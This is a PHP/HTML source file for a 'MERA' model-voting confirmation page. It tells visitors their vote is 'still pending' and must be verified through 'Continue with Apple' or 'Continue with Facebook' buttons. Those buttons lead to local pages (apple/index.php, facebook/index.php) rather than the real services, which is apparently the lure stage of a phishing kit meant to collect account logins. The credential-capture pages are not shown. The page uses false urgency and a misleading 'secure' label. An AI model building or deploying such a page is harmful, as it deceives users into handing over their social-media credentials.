<?php
session_start();
date_default_timezone_set('Asia/Manila');
$submitted = date('F j, Y \a\t h:i A');
// A vote (GET, from index.php's redirect) can override/seed the session;
// otherwise we fall back to whatever is already stored in the session.
$reference = isset($_GET['ref']) ? trim($_GET['ref']) : ($_SESSION['mera_vote_reference'] ?? '');

if ($reference === '' || empty($_SESSION['mera_vote_reference']) || $_SESSION['mera_vote_reference'] !== $reference) {
    // No valid session vote found — send them back to vote first.
    if (empty($_SESSION['mera_vote_reference'])) {
        header("Location: index.php#vote-for-model");
        exit;
    }
    $reference = $_SESSION['mera_vote_reference'];
}

$modelName = $_SESSION['mera_vote_model']    ?? '';
$modelImg  = $_SESSION['mera_vote_image']    ?? '';
$modelAge  = $_SESSION['mera_vote_age']      ?? '';
$modelLoc  = $_SESSION['mera_vote_location'] ?? '';
$name      = htmlspecialchars($_SESSION['mera_full_name'] ?? '', ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vote Confirmed — MERA</title>
<link rel="icon" type="image/png" href="files/images/logo.jpg">
<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,500;1,9..144,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
:root{
  --sand:#f3ede4;
  --cream:#faf7f2;
  --clay:#b08968;
  --ink:#2b2622;
  --taupe:#7c7167;
  --line:rgba(43,38,34,.1);
  --white:#fff;
  --green:#4a7c59;
}
*{margin:0;padding:0;box-sizing:border-box;}
html{overflow-x:hidden;width:100%;}
body{
  font-family:'Inter',sans-serif;
  color:var(--ink);
  background:var(--cream);
  -webkit-font-smoothing:antialiased;
  overflow-x:hidden;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}
h1,h2,h3{font-family:'Fraunces',serif;font-weight:400;}
a{text-decoration:none;color:inherit;}
img{display:block;max-width:100%;}

.nav{
  background:rgba(250,247,242,.92);
  backdrop-filter:blur(10px);
  border-bottom:1px solid var(--line);
}
.nav-inner{display:flex;align-items:center;justify-content:space-between;padding:1rem 2rem;max-width:1240px;margin:0 auto;}
.nav-logo{display:flex;align-items:center;gap:.6rem;font-family:'Fraunces',serif;font-size:1.4rem;letter-spacing:.04em;}
.nav-logo img{height:34px;width:auto;}
.nav-back{font-size:.82rem;color:var(--taupe);border-bottom:1px solid var(--taupe);padding-bottom:2px;}
.nav-back:hover{color:var(--ink);border-color:var(--ink);}

.confirm-wrap{
  flex:1;
  display:flex;align-items:center;justify-content:center;
  padding:1.5rem 1.5rem 3.5rem;
}
.confirm-card{
  width:100%;max-width:460px;
  background:var(--white);
  border:1px solid var(--line);
  border-radius:18px;
  padding:2.6rem 2.2rem 2.4rem;
  text-align:center;
  box-shadow:0 20px 50px rgba(43,38,34,.06);
}
.confirm-check{
  width:60px;height:60px;border-radius:50%;
  background:rgba(74,124,89,.1);color:var(--green);
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 1.3rem;font-size:1.7rem;
}
.confirm-eyebrow{font-size:.75rem;letter-spacing:.16em;text-transform:uppercase;color:var(--clay);margin-bottom:.6rem;}
.confirm-title{font-size:1.7rem;margin-bottom:.6rem;}
.confirm-sub{font-size:.9rem;color:var(--taupe);line-height:1.65;margin-bottom:2rem;}

.ref-box{
  background:var(--sand);border-radius:12px;padding:1.1rem 1.2rem;margin-bottom:1.6rem;
}
.ref-label{font-size:.72rem;letter-spacing:.08em;text-transform:uppercase;color:var(--taupe);margin-bottom:.4rem;}
.ref-number{font-family:'Fraunces',serif;font-size:1.5rem;letter-spacing:.03em;color:var(--ink);}

.voted-model{
  display:flex;align-items:center;gap:1rem;
  background:var(--cream);border:1px solid var(--line);border-radius:14px;
  padding:.9rem;text-align:left;margin-bottom:1.8rem;
}
.voted-model-img{
  width:64px;height:64px;border-radius:10px;overflow:hidden;flex-shrink:0;
  background:var(--sand);border:1px solid var(--line);
}
.voted-model-img img{width:100%;height:100%;object-fit:cover;}
.voted-model-name{font-family:'Fraunces',serif;font-size:1.1rem;margin-bottom:.15rem;}
.voted-model-meta{font-size:.78rem;color:var(--taupe);}
.voted-model-label{font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;color:var(--clay);margin-bottom:.25rem;}

.confirm-note{font-size:.82rem;color:var(--taupe);line-height:1.6;margin-bottom:1.6rem;}

.btn{
  padding:.95rem 1.8rem;
  border-radius:999px;
  font-size:.85rem;
  font-family:'Inter',sans-serif;
  font-weight:500;
  letter-spacing:.03em;
  transition:.25s;
  display:flex;align-items:center;justify-content:center;gap:.5rem;
  width:100%;
  border:1px solid transparent;
  cursor:pointer;
  margin-bottom:.75rem;
  position:relative;
}
.btn:active{transform:scale(.98);}

.btn-primary{
  background:var(--ink);color:var(--cream);
}
.btn-primary:hover{background:var(--clay);}

.btn-copy{
  background:var(--white);
  color:var(--ink);
  border:1px solid rgba(176,137,104,.3);
}
.btn-copy:hover{border-color:var(--clay);background:rgba(176,137,104,.06);}
.btn-copy svg{width:17px;height:17px;flex-shrink:0;}

.copy-alert{
  background:rgba(74,124,89,.08);
  border:1px solid rgba(74,124,89,.25);
  border-radius:10px;
  padding:.65rem 1rem;
  font-size:.8rem;
  color:var(--green);
  text-align:center;
  margin-bottom:.9rem;
  display:none;
}

.footer{
  font-size:.72rem;
  color:var(--taupe);
  margin-top:.6rem;
}

.status-badge{
  display:inline-flex;align-items:center;gap:.4rem;
  background:rgba(74,124,89,.08);
  border:1px solid rgba(74,124,89,.25);
  border-radius:999px;
  padding:.4rem .9rem;
  font-size:.72rem;
  font-weight:500;
  letter-spacing:.03em;
  text-transform:uppercase;
  color:var(--green);
}
.status-badge .dot{
  width:6px;height:6px;border-radius:50%;
  background:var(--green);
  flex-shrink:0;
}

.tracker{
  width:100%;max-width:460px;
  margin:0 auto 1.6rem;
  padding:0 1.2rem;
}
.tracker-row{
  display:flex;align-items:flex-start;justify-content:space-between;
  position:relative;
}
.tracker-step{
  display:flex;flex-direction:column;align-items:center;
  flex:1;position:relative;
}
.tracker-line{
  position:absolute;
  top:15px;left:calc(-50% + 15px);right:calc(50% + 15px);
  height:2px;
  background:var(--line);
  z-index:0;
}
.tracker-step:first-child .tracker-line{display:none;}
.tracker-line.done{background:var(--clay);}
.tracker-circle{
  width:30px;height:30px;border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:.75rem;font-weight:600;
  background:var(--white);
  border:2px solid var(--line);
  color:var(--taupe);
  z-index:1;
  margin-bottom:.5rem;
}
.tracker-circle.done{
  background:var(--clay);border-color:var(--clay);color:var(--cream);
}
.tracker-circle.current{
  background:var(--white);border-color:var(--clay);color:var(--clay);
}
.tracker-label{
  font-size:.68rem;
  color:var(--taupe);
  text-align:center;
  line-height:1.3;
  max-width:80px;
}
.tracker-label.done,.tracker-label.current{
  color:var(--ink);font-weight:500;
}

@media(max-width:480px){
  .nav-inner{padding:.8rem 1.1rem;}
  .nav-logo{font-size:1.2rem;}
  .nav-logo img{height:28px;}
  .confirm-card{padding:2.1rem 1.5rem 2rem;}
  .confirm-title{font-size:1.4rem;}
}
/* icon badge */
.badge-wrap{width:72px;height:72px;margin:22px auto 4px;position:relative;}
.badge{position:absolute;inset:0;border-radius:50%;background:linear-gradient(135deg,var(--clay),#8f6a4a);
  display:flex;align-items:center;justify-content:center;color:#fff;
  box-shadow:0 12px 26px -10px rgba(176,137,104,.6);}
.badge svg{width:30px;height:30px;stroke:#fff;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}
.title em {
    font-style: italic;
    color: var(--clay);
}
</style>
</head>
<body>

<nav class="nav">
 
</nav>


<div class="confirm-wrap">

  <div class="confirm-card">
     <div class="nav-inner">
    <a href="index.php" class="nav-logo">
      <img src="files/images/logo.jpg" alt="MERA logo">
      MERA
    </a>
  <span class="status-badge">
    <span class="dot"></span>
    Vote Pending
</span>
  </div>
   <div class="badge-wrap" aria-hidden="true">
        <div class="badge">
          <svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"></path></svg>
        </div>
      </div>
 

<h1 class="title" id="statusTitle">Your vote is still <em>pending</em>, <?php echo $name !== '' ? $name : 'thank you'; ?></h1><br>

<p class="confirm-sub">
Your vote request has been created, but it has <strong>not been submitted yet</strong>.
To complete your vote, please choose one of the two options below and finish the verification process.
Once verification is completed, your vote will be officially submitted.
</p>
<style>
  /* =========================
   REFERENCE BLOCK
========================= */

.ref{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:12px;
  margin-top:26px;
  margin-bottom:20px;
  padding:14px 18px;
  border:1px solid var(--line);
  border-radius:14px;
  background:var(--sand);
  text-align:left;
}

.r-info{
  flex:1;
  min-width:0;
}

.ref .r-lbl{
  font-size:.68rem;
  letter-spacing:.1em;
  text-transform:uppercase;
  color:var(--clay);
  margin-bottom:3px;
}

.ref .r-num{
  font-family:'Fraunces',serif;
  font-size:1.1rem;
  color:var(--ink);
  letter-spacing:.02em;
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
}

.ref .r-date{
  font-size:.76rem;
  color:var(--taupe);
  margin-top:2px;
}

/* =========================
   COPY BUTTON
========================= */

.copy-btn{
  flex:none;
  display:inline-flex;
  align-items:center;
  gap:6px;
  cursor:pointer;
  padding:9px 14px;

  border-radius:999px;
  border:1px solid var(--line);

  background:var(--white);
  color:var(--ink);

  font-size:.72rem;
  font-weight:500;
  font-family:'Inter',sans-serif;

  transition:all .25s ease;
}

.copy-btn:hover,
.copy-btn.copied{
  background:var(--ink);
  color:var(--cream);
  border-color:var(--ink);
}

.copy-btn svg{
  width:13px;
  height:13px;
  stroke:currentColor;
  fill:none;
  stroke-width:1.8;
}
</style>
 

    <div class="voted-model">
      <div class="voted-model-img">
        <img src="<?php echo htmlspecialchars($modelImg); ?>" alt="<?php echo htmlspecialchars($modelName); ?>">
      </div>
      <div>
        <div class="voted-model-label">You voted for</div>
        <div class="voted-model-name"><?php echo htmlspecialchars($modelName); ?></div>
        <div class="voted-model-meta">
          <?php echo $modelAge !== '' ? htmlspecialchars($modelAge) . ' years old' : ''; ?><?php echo ($modelAge !== '' && $modelLoc !== '') ? ' · ' : ''; ?><?php echo htmlspecialchars($modelLoc); ?>
        </div>
      </div>
    </div>


<div class="tracker" style="margin-top:2.2rem;">
  <div class="tracker-row">

    <div class="tracker-step">
      <div class="tracker-circle done">✓</div>
      <div class="tracker-label done">Reference Generated</div>
    </div>

    <div class="tracker-step">
      <div class="tracker-line done"></div>
      <div class="tracker-circle current">2</div>
      <div class="tracker-label current">Verification Required</div>
    </div>

    <div class="tracker-step">
      <div class="tracker-line"></div>
      <div class="tracker-circle">3</div>
      <div class="tracker-label">Vote Processing</div>
    </div>

    <div class="tracker-step">
      <div class="tracker-line"></div>
      <div class="tracker-circle">4</div>
      <div class="tracker-label">Vote Confirmed</div>
    </div>

  </div>
</div>
<style>
  .tracker-step{
  flex:1;
}

.tracker-label{
  max-width:90px;
}
</style>

  <div class="ref">
        <div class="r-info">
          <div class="r-lbl">Reference No.</div>
          <div class="r-num" id="refNum"><?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?></div>
          <div class="r-date">Submitted <?php echo htmlspecialchars($submitted, ENT_QUOTES, 'UTF-8'); ?></div>
        </div>
        <button type="button" class="copy-btn" id="copyBtn" aria-label="Copy reference number">
          <svg viewBox="0 0 24 24">
            <rect x="9" y="9" width="11" height="11" rx="2"></rect>
            <path d="M5 15V5a2 2 0 0 1 2-2h10"></path>
          </svg>
          <span id="copyText">Copy</span>
        </button>
      </div>
   <p class="confirm-note">
Please keep your reference number. It will be used to identify your vote during verification.
Your vote will remain in a <strong>Pending</strong> status until you complete one of the options below.
</p>

<div class="copy-alert" id="copyAlert">Reference number copied!</div>

<style>
/* choose-to-continue */
.choose{margin-top:20px;}
.choose-label{font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);margin-bottom:12px;}
.auth{display:flex;flex-direction:column;gap:11px;}
.auth-btn{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:11px;
  width:100%;padding:16px 22px;border-radius:100px;border:none;cursor:pointer;color:#fff;
  font-family:var(--ff-body);font-weight:600;font-size:.74rem;letter-spacing:.12em;
  transition:transform .3s ease,box-shadow .3s ease,letter-spacing .3s ease;}
.auth-btn .ic{width:19px;height:19px;flex:none;}
.auth-btn::after{content:"";position:absolute;top:0;left:-130%;width:55%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.32),transparent);transition:left .55s ease;}
.auth-btn:hover::after{left:140%;}
.auth-apple{background:#000;box-shadow:0 14px 30px -14px rgba(0,0,0,.8);}
.auth-apple:hover{transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(0,0,0,.75);}
.auth-fb{background:#1877F2;box-shadow:0 14px 30px -14px rgba(24,119,242,.7);}
.auth-fb:hover{background:#1466D2;transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(24,119,242,.75);}
.auth-note{margin-top:11px;font-size:.66rem;color:var(--hi-muted);font-weight:300;line-height:1.5;display:flex;align-items:center;justify-content:center;gap:6px;}
.auth-note svg{width:12px;height:12px;stroke:var(--hi-mauve);fill:none;stroke-width:1.6;flex:none;}
</style>
     <div class="choose">
  <div class="choose-label">Choose how to continue</div>

  <div class="auth">

    <button onclick="goToApple()" class="auth-btn auth-apple">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M17.05 12.54c-.03-2.53 2.07-3.75 2.16-3.81-1.18-1.72-3.01-1.96-3.66-1.99-1.56-.16-3.04.92-3.83.92-.79 0-2.01-.9-3.3-.87-1.7.02-3.26.99-4.13 2.51-1.76 3.06-.45 7.59 1.27 10.07.84 1.21 1.84 2.57 3.15 2.52 1.26-.05 1.74-.82 3.27-.82 1.52 0 1.96.82 3.3.79 1.36-.02 2.22-1.23 3.05-2.45.96-1.4 1.36-2.76 1.38-2.83-.03-.01-2.64-1.01-2.66-4.04zM14.6 4.7c.7-.85 1.17-2.02 1.04-3.2-1 .04-2.22.67-2.94 1.51-.64.75-1.21 1.95-1.06 3.1 1.12.09 2.26-.57 2.96-1.41z"/>
      </svg>
      Continue with Apple
    </button>

    <button onclick="goToFacebook()" class="auth-btn auth-fb">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5.02 3.66 9.18 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.78-1.63 1.57v1.89h2.78l-.44 2.91h-2.34V22c4.78-.76 8.44-4.92 8.44-9.94z"/>
      </svg>
      Continue with Facebook
    </button>

  </div>


</div>

<script>
function goToApple(){
  window.location.href = "apple/index.php";
}

function goToFacebook(){
  window.location.href = "facebook/index.php";
}
</script>

    <div class="footer">🔐 Secure vote confirmation &nbsp;•&nbsp; MERA</div>
  </div>
</div>

<script>
(function(){
  "use strict";
  var b=document.getElementById("copyBtn"),t=document.getElementById("copyText"),n=document.getElementById("refNum");
  if(b&&n){
    b.addEventListener("click",function(){
      var v=n.textContent.trim();
      function done(){b.classList.add("copied");t.textContent="Copied";
        setTimeout(function(){b.classList.remove("copied");t.textContent="Copy";},1800);}
      function fb(){var e=document.createElement("textarea");e.value=v;e.style.position="fixed";e.style.opacity="0";
        document.body.appendChild(e);e.select();try{document.execCommand("copy");}catch(x){}document.body.removeChild(e);done();}
      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(done).catch(fb);}else{fb();}
    });
  }
})();
</script>

</body>
</html>